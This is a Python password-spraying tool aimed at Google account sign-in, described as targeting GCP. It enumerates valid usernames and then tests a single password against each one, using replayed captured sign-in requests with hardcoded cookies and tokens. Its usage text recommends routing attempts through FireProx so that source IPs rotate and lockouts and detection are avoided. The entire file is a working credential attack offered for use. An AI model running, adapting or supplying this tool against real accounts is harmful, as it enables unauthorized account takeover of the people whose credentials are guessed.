import requests
import argparse
import time


description = """
This script will perform password spraying against Google Cloud Plataform (GCP).
Made by: Kali Nathalie (https://www.linkedin.com/in/kali-nathalie/)
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 gcpsray.py --userlist ./userlist.txt --password Winter2020
This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 gcpsray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
"""

parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)

parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
parser.add_argument("--url", default="https://accounts.google.com", help="The URL to spray against (default is https://accounts.google.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")

args = parser.parse_args()

password = args.password
url = args.url
out = args.out
verbose = args.verbose
sleep = args.sleep

usernames = []
with open(args.userlist, "r") as userlist:
    usernames = userlist.read().splitlines()

username_count = len(usernames)

print(f"There are {username_count} users in total to spray,")
print("Now spraying Microsoft Online.")
print(f"Current date and time: {time.ctime()}")

results = ""
username_counter = 0
for username in usernames:

    if username_counter>0 and sleep>0:        
        time.sleep(sleep)
        
    username_counter += 1
    print(f"{username_counter} of {username_count} users tested", end="\r")

    session = requests.session()
    burp1_url = f"{url}/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe&source-path=%2Fv3%2Fsignin%2Fidentifier&f.sid=-4908207295978009946&bl=boq_identityfrontendauthuiserver_20221009.08_p0&hl=en-US&_reqid=1152556&rt=c"
    burp1_cookies = {"NID": "511=kXAWgIRfiwLsu-Xmq1IMwwMODvF85lurraKRBgsK3g1Gw9uJ7ZsD05W_lUQL8uDzhWvfBJtLFGWgy-yp7l6TZwshmBwvSHMcR46nwuqAdYStXCZdQlK0d3wgDoVxFXF2El1q9d6U64tlhXn5h8MbUg_WqjbuCis9w9LSsw05GVUeGXq_ui28kGeOoMHnpliAjhf3mIl9AXcL_R51BzjDqKpx7zXz4JoIeMYo", "ANID": "AHWqTUn6Uj88URmsch8TJ8t67914wIn49ogZzX-0zy8Ck1ZffyRa9sopyOXg9q05", "__Host-GAPS": "1:daz6H_XfuiSwx9R1wEqhFHqlxRfxUQ:QT8wHqexf7xPNUOJ", "AEC": "AakniGNJ0Zq0UA346ZM_TOR1n9WgMWj4xXSPwSd9amMlFFu-km-IOyh3JOo", "1P_JAR": "2022-10-05-20", "OGPC": "19027681-1:", "OTZ": "6728736_68_68__68_"}
    burp1_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://accounts.google.com/", "X-Same-Domain": "1", "X-Goog-Ext-278367001-Jspb": "[\"GlifWebSignIn\"]", "X-Goog-Ext-391502476-Jspb": "[\"S1795859181:1666027934472327\",\"accountsettings\",null,\"AQDHYWqKGgwoSgWIByU9wE2LXSjDbMNp4fpLgWveVBhpalmWsNohj6qFUC9aNn9RmACdDFyQOc2cXg\"]", "Content-Type": "application/x-www-form-urlencoded;charset=utf-8", "Origin": "https://accounts.google.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
    burp1_data = f"f.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22{username}%5C%22%2Ctrue%2Cnull%2Cnull%2Ctrue%2Ctrue%2C%5B%5D%2Cnull%2C%5C%22S1795859181%3A1666027934472327%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2C%5C%22accountsettings%5C%22%2Cnull%2Cnull%2C%5C%22https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%5C%22%5D%2Cnull%2C%5C%22%5C%22%2C%5C%22BR%5C%22%2C%5Bnull%2Cnull%2C%5C%22S1795859181%3A1666027934472327%5C%22%2C%5C%22ServiceLogin%5C%22%2C%5C%22https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%5C%22%2C%5C%22accountsettings%5C%22%2C%5B%5B%5C%22continue%5C%22%2C%5C%22https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%5C%22%5D%2C%5B%5C%22dsh%5C%22%2C%5C%22S1795859181%3A1666027934472327%5C%22%5D%2C%5B%5C%22flowEntry%5C%22%2C%5C%22ServiceLogin%5C%22%5D%2C%5B%5C%22flowName%5C%22%2C%5C%22GlifWebSignIn%5C%22%5D%2C%5B%5C%22ifkv%5C%22%2C%5C%22AQDHYWqKGgwoSgWIByU9wE2LXSjDbMNp4fpLgWveVBhpalmWsNohj6qFUC9aNn9RmACdDFyQOc2cXg%5C%22%5D%2C%5B%5C%22service%5C%22%2C%5C%22accountsettings%5C%22%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C%5B%5C%22youtube%3A315%3A1%5C%22%2C%5C%22youtube%5C%22%2Ctrue%5D%2Cnull%2Cnull%2C%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2C0%2Cfalse%2C1%2C%5C%22%5C%22%5D%2Cnull%2C7%2Cnull%2C%5B%5B%5C%22identity-signin-identifier%5C%22%2C%5C%22!LS6lLmPNAAZ0UGiYVFBCuT8_0R5NLk87ACkAIwj8Rpn-b0Xu0tJCQAPFbSGZ0xYRF6WN7CTzkWgrj_AdbuuQhLFixQIAAAA1UgAAACpoAQeZAwDXYqAMBUoy7WnZU7aIqV1-YcKBZOESkOrzgsIr6NSnlm8AcWln_Esnw6ZLfPI8NNsgWT6i5lOXuWYnzDfLwqbvkP-GF0Cw_sTuNyfG3Yw3GPrOi-yeZuylzf1SQy92my5LKrBK6cIV7tcw-18PO4f5XYOYMHlC0QVtkQ5qr-cbXGOd_foyPeZHLSyZIEb_qXQT-Gd90rOYouggTW78FMHd97YodTZ9mFZIb4Ec55viaWngEA7MP-fFy-a94duGArXYZAcXEJJz9Fv3EPIeAeUiH4hZz66hV8mzGVOKgGv9RSr9vLqWiKXcDN9HtB_p-ge0kYPbGeAU-nQGjhBkQwmO3rGaQI3eqUSZBr1AJt7I3UTbCUCxrzIM83pOkpj_RHf7Zxji_wMUr-NHxzvtLLm_BnQX2SBd16Dju-N5b3IK6TJn1vLoQR6MtLMeDWKm3AQOiEbeQrwO7F7WCy0sM7ULU7X8qyju59nX1YOUXQNIWmfy2WKpibijmRoxEkEA-v9tQDp-mH4eBbKV3wMoK1bWlga6bK1DywulYmRd2Mi32dGzqFqidwM5wqZyqOYA7HC0tugK_4MBo5f1bgdYB8bBkkitkgv4_Xe1Xna8r3Tf-4Qj0FBG191gCw2YHIPry8O1yb83OZyM0o5mOVJMAZ26LX31DUWT9HCCdVlDGEB03WiIovX-yi-6oroDiJRMokCNzmdz9wCG9On6thapi3mxrLFbA71ed9GhAjnG6ffwZ-CDZVu7nlLR75852giHAlD4Mhl6amHsWgiXLujse6zrCw9MxLLyPSQp21osojrAuCJWsa26OKt-lyzY8_hMeYUDVgcaW0XhFUVB3pCULh5rRaOxeuZVTFm_S6VANuM2h9pWpffV4hXw9qbx0Z5uJBxKaiRuK_Uj7R3NMsyMiovarpWpZQIcNbkrMg-9BTBSnh3bdBBMWbNNqKl6hOsTNccOdYVpajXR7fSmC8xNwqtdpdIUK8nOAsURtvPTNegpNhIDV0d9Mur_GUALAj56sW8%5C%22%5D%5D%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2C%5B%5B%5C%22dsh%5C%22%2C%5B%5C%22S1795859181%3A1666027934472327%5C%22%5D%5D%2C%5B%5C%22continue%5C%22%2C%5B%5C%22https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%5C%22%5D%5D%2C%5B%5C%22flowEntry%5C%22%2C%5B%5C%22ServiceLogin%5C%22%5D%5D%2C%5B%5C%22flowName%5C%22%2C%5B%5C%22GlifWebSignIn%5C%22%5D%5D%2C%5B%5C%22service%5C%22%2C%5B%5C%22accountsettings%5C%22%5D%5D%2C%5B%5C%22ifkv%5C%22%2C%5B%5C%22AQDHYWqKGgwoSgWIByU9wE2LXSjDbMNp4fpLgWveVBhpalmWsNohj6qFUC9aNn9RmACdDFyQOc2cXg%5C%22%5D%5D%5D%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AE9pQYz8OG212SE6MMCOAES1vBrL%3A1666027934622&"

    r1 = session.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp1_data)

    #print("Primeira response", r1.content)

    #Se o email existe
    if username in str(r1.content):
        babado = r1.content.split(b"\"TL")[1].split(b"checkedDomains\\")[0][5:-7].decode("utf-8")
        #print("O babado é", babado)
        
        #teste da senha
        session = requests.session()
        burp2_url = f"{url}/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb&source-path=%2Fv3%2Fsignin%2Fchallenge%2Fpwd&f.sid=-4908207295978009946&bl=boq_identityfrontendauthuiserver_20221009.08_p0&hl=en-US&TL={babado}&_reqid=1752556&rt=c"
        burp2_cookies = {"NID": "511=kXAWgIRfiwLsu-Xmq1IMwwMODvF85lurraKRBgsK3g1Gw9uJ7ZsD05W_lUQL8uDzhWvfBJtLFGWgy-yp7l6TZwshmBwvSHMcR46nwuqAdYStXCZdQlK0d3wgDoVxFXF2El1q9d6U64tlhXn5h8MbUg_WqjbuCis9w9LSsw05GVUeGXq_ui28kGeOoMHnpliAjhf3mIl9AXcL_R51BzjDqKpx7zXz4JoIeMYo", "ANID": "AHWqTUn6Uj88URmsch8TJ8t67914wIn49ogZzX-0zy8Ck1ZffyRa9sopyOXg9q05", "__Host-GAPS": "1:3rChWNl1HRGK_A6ZzixV91fVouAZ2w:wB_kQ8EKLuAOUrGO", "AEC": "AakniGNJ0Zq0UA346ZM_TOR1n9WgMWj4xXSPwSd9amMlFFu-km-IOyh3JOo", "1P_JAR": "2022-10-05-20", "OGPC": "19027681-1:", "OTZ": "6728736_68_68__68_"}
        burp2_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://accounts.google.com/", "X-Same-Domain": "1", "X-Goog-Ext-278367001-Jspb": "[\"GlifWebSignIn\"]", "X-Goog-Ext-391502476-Jspb": "[\"S1795859181:1666027934472327\",\"accountsettings\",null,\"AQDHYWqKGgwoSgWIByU9wE2LXSjDbMNp4fpLgWveVBhpalmWsNohj6qFUC9aNn9RmACdDFyQOc2cXg\"]", "Content-Type": "application/x-www-form-urlencoded;charset=utf-8", "Origin": "https://accounts.google.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
        burp2_data = f"f.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C1%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22{password}%5C%22%2Cnull%2Ctrue%5D%5D%2C%5Bnull%2C%5C%22accountsettings%5C%22%2Cnull%2Cnull%2C%5C%22https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%5C%22%5D%2Cnull%2C%5B%5B%5B%5C%22TL%5C%22%2C%5C%22{babado}%5C%22%5D%2C%5B%5C%22checkConnection%5C%22%2C%5C%22youtube%3A336%3A1%5C%22%5D%2C%5B%5C%22checkedDomains%5C%22%2C%5C%22youtube%5C%22%5D%2C%5B%5C%22cid%5C%22%2C%5C%221%5C%22%5D%2C%5B%5C%22continue%5C%22%2C%5C%22https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%5C%22%5D%2C%5B%5C%22dsh%5C%22%2C%5C%22S1795859181%3A1666027934472327%5C%22%5D%2C%5B%5C%22flowEntry%5C%22%2C%5C%22ServiceLogin%5C%22%5D%2C%5B%5C%22flowName%5C%22%2C%5C%22GlifWebSignIn%5C%22%5D%2C%5B%5C%22ifkv%5C%22%2C%5C%22AQDHYWqKGgwoSgWIByU9wE2LXSjDbMNp4fpLgWveVBhpalmWsNohj6qFUC9aNn9RmACdDFyQOc2cXg%5C%22%5D%2C%5B%5C%22pstMsg%5C%22%2C%5C%221%5C%22%5D%2C%5B%5C%22service%5C%22%2C%5C%22accountsettings%5C%22%5D%5D%2C%5C%22accounts.google.com%5C%22%2C%5C%22%2Fv3%2Fsignin%2Fchallenge%2Fpwd%5C%22%5D%2Cnull%2C%5B%5B%5C%22identity-signin-password%5C%22%2C%5C%22!GBulG1bNAAZ0UGiYVFBCFmOD1lPlCxI7ACkAIwj8RrFZ-C-x5c1HHym_VqBzR3Pn-GG8U0EqjRQlhNsjgn7edLcXlwIAAAAtUgAAAAhoAQcKAB1C61kvoKAexTdeujPsHLAHmP6Ma-qyQWylPjrazJkCxygfDVg6zRZAtKqi7zra-MEGcSS_d2Jx_iKBSx8meYg14i1999kdmuNAFxR5yWcHLSpuPJyHncDWNkaYL8Ur2dSzv2xzBdxRZrpJx9___srwiedy0QSxynOQQKm_8RQE69DJM_QVKTS7nWrID2fqCJlh4cvqyTaIRRDeZG-yH_kxdqJGIMYgNuU4nis0L5nZJD_ghiwyAbF8xxMNjHDEAYl4u7WBcWXE1ccevWN4k8bTH5kZDhv2YignBNJ_DrFOim0Ztd8tDdHr7R8yMDWbIKlr2UD1mmTAt-jAwyqjDnAD-oFrMJRmy9GWS7wckWP-1LyKq5eqZAwzKouGDS8SE3WR1dwCFQ1Qefp44Ge2U4dWDWmHltqWqmUv-Q1bFRwnAvLYOa6lNF1EYG9FMSqaYNAZeqap1qP1zPjIVIKCsYYy_uKx2xmzYPqheSxUdFrnII3w2zakuO3yS8JgB2HzdxTHKh_zM2nxGenwA6-1MmOpx8OKCXJWkdbVeI3r5STloU4iuEN1ie5aJ4tmOlkQNtpPRU3DxaLMKjDm_1aaJ8xQmn3S0ppJOBiV4vv-_boiyan6IWYHffobZ7Yupd8Kc2c0ALhRrGkdrodD_sxQukwqjXvOg2dusELVk0aVkkq0cxZ3PKbakc72EzMlUYz18tXoCsbETTSE6uXov5FSPH7bYihItfU6gvSdnKj6MdCZIBSYUi84E3zZ_YnMH4XWkqBbkRgB-gHTAa0U_X7V5VD2N2SCWknzi26gC4THgqBNrdI-gPGBZ150ATkTA6QA-JkS-QsnXRVBTNbEX8E2CXS1xCEoV8Eb6s69wV740iDZOrpVhi0OuIl1LKL95JH4ISkeviRZoQKOhG6G_6hLdxEU--_uuphQIxIc7u9jyhmM7gpRWMdzy29LKsvBaj5cJ32taaujRmJZcrNLngIY2hNe_wDqzCQE-A%5C%22%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AE9pQYz8OG212SE6MMCOAES1vBrL%3A1666027934622&"
        
        r2 = session.post(burp2_url, headers=burp2_headers, cookies=burp2_cookies, data=burp2_data)
        password_resp = str(r2.content)

        #print("Segunda response", r2.content)

        #senha deu certo
        if not "INCORRECT_ANSWER_ENTERED" in password_resp:
            print(f"\033[92mSUCCESS! {username} : {password}")
            results += f"{username} : {password}\n"
        else:
            if verbose:
                print(f"\033[93mVERBOSE: Invalid password. Username: {username} : {password} does not exist")
            continue
    else:
        if verbose:
            print(f"\033[91mVERBOSE: Invalid username. Username: {username} does not exist.")
        continue


if out and results != "":
    with open(out, 'w') as out_file:
        out_file.write(results)
        print(f"Results have been written to {out}.")